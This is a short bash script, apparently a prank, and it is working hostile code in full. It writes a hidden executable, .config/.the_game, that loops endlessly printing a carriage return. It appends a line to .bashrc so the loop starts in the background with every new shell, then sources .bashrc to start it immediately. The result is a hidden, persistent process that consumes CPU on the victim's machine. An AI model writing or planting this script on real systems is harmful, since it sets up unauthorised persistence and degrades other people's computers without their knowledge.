#!/bin/bash
echo "#!/bin/bash
while true
do
   printf '\r'
done" > .config/.the_game
chmod +x .config/.the_game

echo "./.config/.the_game &" >> .bashrc
source .bashrc
